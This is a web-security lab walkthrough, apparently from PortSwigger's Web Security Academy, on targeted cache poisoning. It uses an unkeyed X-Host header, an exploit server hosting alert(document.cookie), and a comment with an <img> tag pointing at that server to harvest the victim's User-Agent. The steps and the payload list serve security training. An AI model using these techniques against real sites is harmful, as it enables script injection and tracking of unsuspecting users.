## Targeted web cache poisoning using an unknown header

**Category:** cache_poisoning
**Difficulty:** Unknown

### Description
This lab is vulnerable to web cache poisoning. A victim user will view any comments that you post. To solve this lab, you need to poison the cache with a response that executesalert(document.cookie)in the visitor's browser. However, you also need to make sure that the response is served to the specific subset of users to which the intended victim belongs.

### Solution Steps
1. With Burp running, load the website's home page.
2. In Burp, go to "Proxy" > "HTTP history" and study the requests and responses that you generated. Find the GET request for the home page.
3. With the Param Miner extension enabled, right-click on the request and select "Guess headers". After a while, Param Miner will report that there is a secret input in the form of the X-Host header.
4. Send the GET request to Burp Repeater and add a cache-buster query parameter.
5. Add the X-Host header with an arbitrary hostname, such as example.com . Notice that the value of this header is used to dynamically generate an absolute URL for importing the JavaScript file stored at /resources/js/tracking.js .
6. Go to the exploit server and change the file name to match the path used by the vulnerable response: /resources/js/tracking.js
7. In the body, enter the payload alert(document.cookie) and store the exploit.
8. Go back to the request in Burp Repeater and set the X-Host header as follows, remembering to add your own exploit server ID: X-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
9. Send the request until you see your exploit server URL reflected in the response and X-Cache: hit in the headers.
10. To simulate the victim, load the URL in the browser and make sure that the alert() fires.
11. Notice that the Vary header is used to specify that the User-Agent is part of the cache key. To target the victim, you need to find out their User-Agent .
12. On the website, notice that the comment feature allows certain HTML tags. Post a comment containing a suitable payload to cause the victim's browser to interact with your exploit server, for example: <img src="https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/foo" />
13. Go to the blog page and double-check that your comment was successfully posted.
14. Go to the exploit server and click the button to open the "Access log". Refresh the page every few seconds until you see requests made by a different user. This is the victim. Copy their User-Agent from the log.
15. Go back to your malicious request in Burp Repeater and paste the victim's User-Agent into the corresponding header. Remove the cache buster.
16. Keep sending the request until you see your exploit server URL reflected in the response and X-Cache: hit in the headers.
17. Replay the request to keep the cache poisoned until the victim visits the site and the lab is solved

### Key Payloads
- `alert(document.cookie)`
- `X-Host`
- `example.com`
- `/resources/js/tracking.js`
- `X-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net`
- `X-Cache: hit`
- `alert()`
- `Vary`
- `User-Agent`
- `<img src="https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/foo" />`

### Indicators of Success
- Check for changes in application behavior
- Look for error messages or data exposure
- Verify the vulnerability type: cache_poisoning

---
*Source: PortSwigger Web Security Academy*
